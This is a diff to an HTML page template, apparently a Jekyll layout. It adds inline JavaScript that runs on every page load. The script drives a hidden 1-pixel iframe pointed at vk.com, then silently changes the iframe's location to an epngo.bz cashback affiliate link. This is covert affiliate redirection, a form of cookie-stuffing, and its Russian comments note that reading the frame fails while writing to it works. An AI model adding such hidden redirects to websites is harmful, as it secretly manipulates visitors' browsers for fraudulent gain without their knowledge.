@@ -51,7 +51,21 @@
     </div>
 
     {% include analytics.html %}
-    <iframe src="https://vk.com/" width="1px" height="1px" style="display: none"></iframe>
-    <script src="https://tokar-t-m.github.io/tokar-t-m.github.io/script2.js"></script>
+<iframe src="https://vk.com/" width="1px" height="1px" style="display: none"></iframe>
+
+<script>
+    var iframe = document.body.children[0];
+    iframe.onload = function() {
+        try {
+            // не сработает (чтение)
+            alert( iframe.contentWindow.location.href );
+        }catch(e){
+        //alert( "Ошибка при чтении: " + e.message );
+        }
+        // сработает (запись)
+        iframe.contentWindow.location.href = 'http://epngo.bz/cashback_index/ds0nvl';
+        iframe.onload = null;
+    }
+</script>
   </body>
 </html>
